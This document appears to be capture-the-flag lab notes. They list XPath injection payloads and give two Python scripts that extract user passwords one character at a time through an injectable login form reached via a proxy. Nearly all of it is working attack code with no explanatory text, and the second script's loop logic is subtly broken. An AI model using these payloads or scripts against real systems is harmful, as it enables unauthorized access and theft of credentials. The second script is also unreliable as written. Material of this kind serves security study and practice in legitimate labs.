```sh
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
search=')] | //user/*[contains(*,'
search=Har') and contains(../password,'c
search=Har') and starts-with(../password,'c
```

Brute-force password

```python
import requests

url = "http://172.31.179.1/intranet.php"
proxy = "http://10.10.10.200:3128"
letters = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%"
users = ['sarah', 'rita', 'jim', 'bryan']

for user in users:
    data = {"Username": '', "Password": "' or username= '" + user + "'or substring(Password,1,1)='p' or'"}
    request = requests.post(url, data=data, proxies={'http':proxy})    
    length = len(request.text)    
    p4ss = ''
    for i in range(1,25):        
        for l in letters:            
            data = {"Username": '', "Password": "' or username= '" + "{}".format(user) + "'or substring(Password,{},1)='{}' or'".format(str(i),l)}
            request1 = requests.post(url, data=data, proxies={'http':proxy})
            if "{}@unbalanced.htb".format(user) in request1.text and len(request1.text) != 6756:
                print("Got hit for User '{}' - Letter is '{}'".format(user, l))
                p4ss += l
                print(str(i))
                print(str(p4ss))
                pass
```

```python
import requests

url = 'http://172.31.179.1/intranet.php'
proxy_url = 'http://10.10.10.200:3128'
w = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&*(){}:"<>?'
u = ['rita','jim','bryan','sarah']

for user in u:
    data = {'Username': '', 'Password': "' or Username='" + user + "' and substring(Password,0,1)='x"}
    request = requests.post(url, data=data, proxies={'http':proxy_url})
    b = len(request.text)
    cracked_pass = ''
    for i in range(1,80):
        found = False
        for c in w:
            data = {'Username': '', 'Password': "' or Username='" + user + "' and substring(Password," + str(i) + ",1)='" + c + ""}
            request = requests.post(url, data=data, proxies={'http':proxy_url})
            if len(request.text) != b:
                found = True
                break
        if not found:
            break
        print('Attempting User {0}'.format(user))
    print('[+]Found character: {2}'.format(user, i, c))
    cracked_pass += c
    print(cracked_pass)
```

